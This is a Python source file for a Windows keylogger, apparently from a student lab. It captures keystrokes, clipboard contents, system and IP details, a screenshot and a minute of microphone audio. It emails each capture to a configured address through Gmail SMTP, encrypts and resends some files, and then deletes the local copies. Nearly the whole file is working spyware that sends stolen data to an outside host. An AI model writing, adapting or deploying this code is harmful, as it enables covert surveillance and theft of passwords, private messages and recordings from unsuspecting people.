from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import threading
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab

# Configuration
keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"
microphone_time = 60
time_iteration = 15
email_address = " " 
password = " " # App password
toaddr = " "
key = " " # generated key
file_path = "C:\\Users\\sltec\\Documents\\Personal Projects\\LAB5\\keylogger"
extend = "\\"
keys_info_e = "e_keys_info.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"

# Email function
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger collected information"
    body = "keylogger collected element"
    msg.attach(MIMEText(body, 'plain'))
    try:
        with open(attachment, 'rb') as attachment_file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment_file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename={filename}')
            msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Computer information
def computer_information():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception as e:
            f.write(f"Unable to get the public IP address: {e}\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Clipboard data
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data + "\n")
        except:
            f.write("Clipboard cannot be copied\n")

# Microphone recording
def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_info, fs, myrecording)

# Screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

# Keylogger functions
count = 0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

def keylogger_thread(duration):
    stopping_time = time.time() + duration
    with Listener(on_press=on_press, on_release=on_release) as listener:
        while time.time() < stopping_time:
            time.sleep(0.1)  # Small sleep to prevent busy-waiting
        listener.stop()
    if keys:  # Write any remaining keys
        write_file(keys)

# Main execution
def main():
    # Start keylogger in a separate thread
    keylogger = threading.Thread(target=keylogger_thread, args=(time_iteration,))
    keylogger.start()

    # Perform other tasks concurrently
    computer_information()
    copy_clipboard()
    screenshot()
    microphone()

    # Wait for keylogger to finish
    keylogger.join()

    # Clear key log file (as in original code)
    with open(file_path + extend + keys_info, "w") as f:
        f.write(" ")

    # Send collected data
    send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
    send_email(audio_info, file_path + extend + audio_info, toaddr)
    send_email(keys_info, file_path + extend + keys_info, toaddr)
    send_email(system_info, file_path + extend + system_info, toaddr)
    send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)

    # Encrypt files
    files_to_encrypt = [
        file_path + extend + keys_info,
        file_path + extend + system_info,
        file_path + extend + clipboard_info
    ]
    encrypted_files = [
        file_path + extend + keys_info_e,
        file_path + extend + system_info_e,
        file_path + extend + clipboard_info_e
    ]

    for i, encrypting_file in enumerate(encrypted_files):
        try:
            with open(files_to_encrypt[i], 'rb') as f:
                data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(encrypted_files[i], 'wb') as f:
                f.write(encrypted)
            send_email(encrypted_files[i], encrypted_files[i], toaddr)
            time.sleep(120)  # Delay between emails to avoid rate limiting
        except Exception as e:
            print(f"Failed to encrypt/send {encrypting_file}: {e}")

    # Clean up files
    delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
    for file in delete_files:
        try:
            os.remove(file_path + extend + file)
        except Exception as e:
            print(f"Failed to delete {file}: {e}")

if __name__ == "__main__":
    main()